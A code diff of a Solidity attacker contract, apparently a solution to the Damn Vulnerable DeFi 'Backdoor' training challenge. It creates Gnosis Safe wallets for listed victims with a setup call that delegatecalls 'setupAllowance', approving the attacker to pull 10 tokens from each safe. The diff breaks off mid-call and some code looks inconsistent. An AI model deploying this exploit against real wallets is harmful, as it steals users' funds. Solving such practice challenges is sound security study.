@@ -5,6 +5,7 @@ import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
 import {WalletRegistry} from "./WalletRegistry.sol";
 import {BackDoorModule} from "./BackDoorModule.sol";
+import "../DamnValuableToken.sol";
 
 // Your contract
 contract WalletCreator {
@@ -13,8 +14,6 @@ contract WalletCreator {
 
     // Address of the Gnosis Safe proxy factory contract
     address immutable gnosisSafeProxyFactory;
-
-    address immutable fallbackHandler;
 
     address immutable paymentToken;
 
@@ -31,21 +30,21 @@ contract WalletCreator {
     constructor(
         address gnosisSafeMasterCopy_,
         address gnosisSafeProxyFactory_,
-        address backdoormodule_,
         WalletRegistry walletRegistry_,
         address[] memory victims_,
-        address fallbackHandler_,
         address paymentToken_,
         address attacker_
     ) {
         gnosisSafeMasterCopy = gnosisSafeMasterCopy_;
         gnosisSafeProxyFactory = gnosisSafeProxyFactory_;
-        _backdoormodule = BackDoorModule(backdoormodule_);
         walletRegistry = walletRegistry_;
         _victims = victims_;
-        fallbackHandler = fallbackHandler_;
         paymentToken = paymentToken_;
         attacker = attacker_;
+    }
+
+    function setupAllowance() external {
+        DamnValuableToken(paymentToken).approve(attacker, 10 ether);
     }
 
     // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
@@ -53,17 +52,15 @@ contract WalletCreator {
     // (respecting threshold and owners of the Safe).
     function createGnosisSafeWallet() public {
         uint256 counter = 0;
-        bytes memory data = abi.encodeWithSignature(
-            "setupWallet(address,address,address)"
-        );
+        bytes memory data = abi.encodeWithSignature("setupAllowance()");
         for (counter; counter < _victims.length; counter++) {
             //  await safe.setup([user1.address, user2.address], 1, AddressZero, "0x", handler.address, AddressZero, 0, AddressZero)
             bytes memory initializer = abi.encodeWithSignature(
                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                 _victims[counter],
                 MAX_THRESHOLD,
-                address(_backdoormodule),
-                0x0,
+                address(this),
+                data,
                 address(0),
                 address(0),
                 0,
